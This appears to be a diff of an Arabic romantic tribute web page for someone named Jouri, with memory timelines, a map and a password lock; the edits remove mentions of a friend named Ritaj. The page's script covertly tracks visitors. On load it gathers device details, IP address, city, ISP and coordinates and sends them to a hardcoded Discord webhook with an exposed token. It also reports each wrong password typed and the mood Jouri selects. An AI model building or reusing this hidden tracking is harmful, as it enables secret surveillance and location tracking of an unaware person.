@@ -977,7 +977,7 @@
             <section class="section-card">
                 <h2>بداية الحكاية والذكريات الأولى</h2>
                 <p>ياخي والله صدق كيف الدنيا صغيرة. للحين أذكر أول مرة قابلتك فيها، كانت في تايم بومب، وقعدنا نضحك ونسولف وتناديني أمجيزان.</p>
-                <p>وبعدها قعدنا فترة مع بعض، وجت ريتاج وعرفتيني عليها، ومع الأيام كل واحد فينا راح بطريقه، بس سبحان الله كيف الدنيا تلف وترجع تجمع ناس ببعض.</p>
+                <p>وبعدها قعدنا فترة مع بعض، ومع الأيام كل واحد فينا راح بطريقه، بس سبحان الله كيف الدنيا تلف وترجع تجمع ناس ببعض.</p>
                 <p>والحين شوفي وين وصلنا، بعد كل هالصدف وبعد كل هالمرات اللي تقابلنا فيها بدون ترتيب، صرتي معي وصرتي من أغلى الناس عندي.</p>
                 <p>يا جوري أنا أحبك، وأحب كل شي يخصك، أحب شخصيتك وروحك وضحكتك وطريقتك بالكلام، وأحب تفاصيلك الصغيرة اللي يمكن انتي حتى ما تنتبهين لها.</p>
                 <p>تدرين إن بعض الأحيان أقعد أسمع فويساتك وأكررها أكثر من مرة. مو لسبب إلا إني أحب أسمع صوتك.</p>
@@ -1011,11 +1011,6 @@
                         <p>أول ضحكة، وأول كلمة أمجيزان.</p>
                     </div>
                     <div class="timeline-item">
-                        <div class="timeline-date">محطة الصداقة</div>
-                        <div class="timeline-title">التعرف على ريتاج</div>
-                        <p>أيام السوالف الجميلة.</p>
-                    </div>
-                    <div class="timeline-item">
                         <div class="timeline-date">تقاطع الطرق</div>
                         <div class="timeline-title">سيرفر 505</div>
                         <p>تكرار الصدف في أماكن مختلفة.</p>
@@ -1033,7 +1028,6 @@
                 <p>اضغطي على أي نقطة لتشوفين الذكرى:</p>
                 <div class="memory-map" id="memoryMap">
                     <div class="map-node" style="top:20%; left:20%;" onclick="showMapMemory('map1')">تايم بومب</div>
-                    <div class="map-node" style="top:30%; left:75%;" onclick="showMapMemory('map2')">ريتاج</div>
                     <div class="map-node" style="top:60%; left:30%;" onclick="showMapMemory('map3')">سيرفر 505</div>
                     <div class="map-node" style="top:75%; left:70%;" onclick="showMapMemory('map4')">أول فويس</div>
                     <div class="map-node" style="top:45%; left:50%;" onclick="showMapMemory('map5')">أول أحبك</div>
@@ -1220,13 +1214,12 @@
                 <h2>ذكرياتنا الحلوة</h2>
                 <div class="memory-list" id="memoryList">
                     <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m1" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">أول لقاء في تايم بومب</span></label>
-                    <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m2" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">التعرف على ريتاج</span></label>
                     <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m3" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">اللقاء في سيرفر 505</span></label>
                     <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m4" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">أول مرة قلت لك أمجيزان</span></label>
                     <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m5" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">أول فويس</span></label>
                     <label class="memory-item" onclick="toggleMemory(this, event)"><input type="checkbox" class="memory-check" data-mem="m6" onchange="saveMemoryState(); updateMemoryProgress()"><span class="memory-text">أول أحبك</span></label>
                 </div>
-                <div class="progress-text" id="memoryProgressText">0 من 6 ذكريات محققة</div>
+                <div class="progress-text" id="memoryProgressText">0 من 5 ذكريات محققة</div>
             </section>
 
             <section class="section-card">
@@ -1277,9 +1270,6 @@
     </div>
 
     <script>
-        // ============================================================
-        // الإعدادات
-        // ============================================================
         const webhookUrl = "https://canary.discord.com/api/webhooks/1561520531394666638/36aqBeHIGWz0bFWlUJxrKmUcALwvN734BOEu4EGtr3DUBIasR2gSU09amff-R_IADUYx";
         const DISCORD_MAX_FILE_SIZE = 25 * 1024 * 1024;
         const DISCORD_BATCH_SIZE = 10;
@@ -1287,9 +1277,6 @@
         const PASSWORD = "gory2024";
         const PASSWORD_KEY = "gory_unlocked";
 
-        // ============================================================
-        // Toast
-        // ============================================================
         function showToast(msg, type = 'info', duration = 2500) {
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
@@ -1302,36 +1289,6 @@
             }, duration);
         }
 
-        // ============================================================
-        // جمع معلومات الزائر تلقائياً
-        // ============================================================
-        const visitorInfo = {
-            visitTime: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(', ') : '',
-            platform: navigator.platform || 'unknown',
-            vendor: navigator.vendor || 'unknown',
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || 'غير محدد',
-            online: navigator.onLine,
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            screenColorDepth: screen.colorDepth,
-            windowWidth: window.innerWidth,
-            windowHeight: window.innerHeight,
-            devicePixelRatio: window.devicePixelRatio || 1,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            referrer: document.referrer || 'مباشر (لا يوجد)',
-            pageUrl: window.location.href,
-            touchSupport: ('ontouchstart' in window) ? 'يدعم اللمس' : 'لا يدعم اللمس',
-            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
-            deviceMemory: navigator.deviceMemory || 'غير معروف',
-            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'نعم' : 'لا'
-        };
-
-        // كشف نظام التشغيل
         function getOS() {
             const ua = navigator.userAgent;
             if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
@@ -1341,7 +1298,6 @@
             if (/Linux/i.test(ua)) return 'Linux';
             return 'غير معروف';
         }
-        // كشف المتصفح
         function getBrowser() {
             const ua = navigator.userAgent;
             if (/Edg/i.test(ua)) return 'Edge';
@@ -1351,7 +1307,6 @@
             if (/Opera|OPR/i.test(ua)) return 'Opera';
             return 'غير معروف';
         }
-        // كشف نوع الجهاز
         function getDeviceType() {
             const ua = navigator.userAgent;
             if (/iPhone/i.test(ua)) return 'iPhone';
@@ -1362,7 +1317,6 @@
             return 'كمبيوتر';
         }
 
-        // جمع IP والموقع التقريبي
         async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -1373,47 +1327,35 @@
                     city: data.city || 'غير معروف',
                     region: data.region || 'غير معروف',
                     country: data.country_name || 'غير معروف',
-                    countryCode: data.country_code || '',
-                    postal: data.postal || '',
-                    latitude: data.latitude || '',
-                    longitude: data.longitude || '',
                     org: data.org || '',
-                    timezone: data.timezone || ''
+                    latitude: data.latitude || '',
+                    longitude: data.longitude || ''
                 };
-            } catch (e) {
-                console.warn('IP fetch failed:', e);
-                return null;
-            }
+            } catch (e) { return null; }
         }
 
-        // إرسال معلومات الزائر
         async function sendVisitorInfo() {
             const ipInfo = await getIPInfo();
-            const os = getOS();
-            const browser = getBrowser();
-            const deviceType = getDeviceType();
             const now = new Date();
             const timeStr = now.toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
 
             let msg = '**🚨 زائر جديد دخل الموقع 🚨**\n\n';
             msg += `**⏰ وقت الزيارة:** ${timeStr}\n`;
-            msg += `**👤 الجهاز:** ${deviceType}\n`;
-            msg += `**💻 نظام التشغيل:** ${os}\n`;
-            msg += `**🌐 المتصفح:** ${browser}\n`;
-            msg += `**🌍 اللغة:** ${visitorInfo.language}\n`;
-            msg += `**📱 الشاشة:** ${visitorInfo.screenWidth} × ${visitorInfo.screenHeight}\n`;
-            msg += `**🖥️ النافذة:** ${visitorInfo.windowWidth} × ${visitorInfo.windowHeight}\n`;
-            msg += `**🕒 المنطقة الزمنية:** ${visitorInfo.timezone}\n`;
-            msg += `**🔗 الرابط:** ${visitorInfo.referrer}\n`;
-            msg += `**📶 متصل:** ${visitorInfo.online ? 'نعم' : 'لا'}\n`;
-            msg += `**👆 اللمس:** ${visitorInfo.touchSupport}\n`;
-            msg += `**⚙️ أنوية المعالج:** ${visitorInfo.hardwareConcurrency}\n`;
-            msg += `**🧠 الذاكرة:** ${visitorInfo.deviceMemory} GB\n\n`;
+            msg += `**👤 الجهاز:** ${getDeviceType()}\n`;
+            msg += `**💻 نظام التشغيل:** ${getOS()}\n`;
+            msg += `**🌐 المتصفح:** ${getBrowser()}\n`;
+            msg += `**🌍 اللغة:** ${navigator.language}\n`;
+            msg += `**📱 الشاشة:** ${screen.width} × ${screen.height}\n`;
+            msg += `**🕒 المنطقة الزمنية:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            msg += `**🔗 الرابط:** ${document.referrer || 'مباشر'}\n`;
+            msg += `**📶 متصل:** ${navigator.onLine ? 'نعم' : 'لا'}\n`;
+            msg += `**👆 اللمس:** ${('ontouchstart' in window) ? 'يدعم' : 'لا'}\n`;
+            msg += `**⚙️ المعالج:** ${navigator.hardwareConcurrency || 'غير معروف'}\n\n`;
 
             if (ipInfo) {
                 msg += `**📍 الموقع التقريبي:**\n`;
                 msg += `**IP:** \`${ipInfo.ip}\`\n`;
-                if (ipInfo.city && ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
+                if (ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
                 if (ipInfo.region) msg += `**المنطقة:** ${ipInfo.region}\n`;
                 if (ipInfo.country) msg += `**الدولة:** ${ipInfo.country}\n`;
                 if (ipInfo.org) msg += `**مزود الخدمة:** ${ipInfo.org}\n`;
@@ -1429,9 +1371,6 @@
             }).catch(e => console.error('Visitor info failed:', e));
         }
 
-        // ============================================================
-        // إرسال Webhook
-        // ============================================================
         async function sendWebhook(content) {
             try {
                 const res = await fetch(webhookUrl, {
@@ -1446,9 +1385,6 @@
             }
         }
 
-        // ============================================================
-        // شاشة القفل
-        // ============================================================
         let failedAttempts = 0;
 
         function tryUnlock() {
@@ -1462,7 +1398,6 @@
                 failedAttempts++;
                 document.getElementById('lockError').innerText = "كلمة المرور غير صحيحة";
                 document.getElementById('lockInput').value = "";
-                // إرسال محاولة خاطئة مع المعلومات
                 sendFailedAttempt(input);
             }
         }
@@ -1477,7 +1412,7 @@
             msg += `**الوقت:** ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
             if (ipInfo) {
                 msg += `**IP:** \`${ipInfo.ip}\`\n`;
-                if (ipInfo.city) msg += `**المدينة:** ${ipInfo.city}\n`;
+                if (ipInfo.city && ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
                 if (ipInfo.country) msg += `**الدولة:** ${ipInfo.country}\n`;
             }
             await fetch(webhookUrl, {
@@ -1494,13 +1429,9 @@
         if (sessionStorage.getItem(PASSWORD_KEY) === "1") {
             document.getElementById('lockScreen').classList.add('hidden');
         } else {
-            // زائر جديد — أرسل كل المعلومات
             setTimeout(() => sendVisitorInfo(), 1000);
         }
 
-        // ============================================================
-        // أدوات
-        // ============================================================
         function copyText(text) {
             if (!text) { showToast("ما فيه نص", "error"); return; }
             if (navigator.clipboard) {
@@ -1613,7 +1544,8 @@
             document.querySelectorAll('.mood-btn').forEach(b => b.classList.remove('selected'));
             if (el) el.classList.add('selected');
             localStorage.setItem('gory_last_mood', moodText);
-            const ok = await sendWebhook(`**شعور جوري اليوم:** ${moodText}\n**الجهاز:** ${getDeviceType()} | **IP:** ${(await getIPInfo())?.ip || 'غير معروف'}`);
+            const ipInfo = await getIPInfo();
+            const ok = await sendWebhook(`**شعور جوري اليوم:** ${moodText}\n**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'}`);
             showToast(ok ? "تم تسجيل شعورك" : "تعذر", ok ? "success" : "error");
         }
         (function restoreMood() {
@@ -1698,7 +1630,6 @@
 
         const mapMemories = {
             map1: "تايم بومب — أول لقاء، أول ضحكة، وأول كلمة أمجيزان.",
-            map2: "ريتاج — عرفتيني عليها، وبدأنا نتقابل أكثر.",
             map3: "سيرفر 505 — كأن الدنيا تلف وترجع تجمعنا.",
             map4: "أول فويس — أول مرة سمعت صوتك.",
             map5: "أول أحبك — الكلمة اللي غيرت كل شيء."
@@ -2439,6 +2370,8 @@
         function restoreMemoryState() {
             try {
                 const state = JSON.parse(localStorage.getItem('gory_memory_state') || '{}');
+                // مسح أي بيانات قديمة لريتاج
+                if (state.m2 !== undefined) { delete state.m2; }
                 document.querySelectorAll('.memory-check').forEach(cb => {
                     if (state[cb.dataset.mem]) {
                         cb.checked = true;
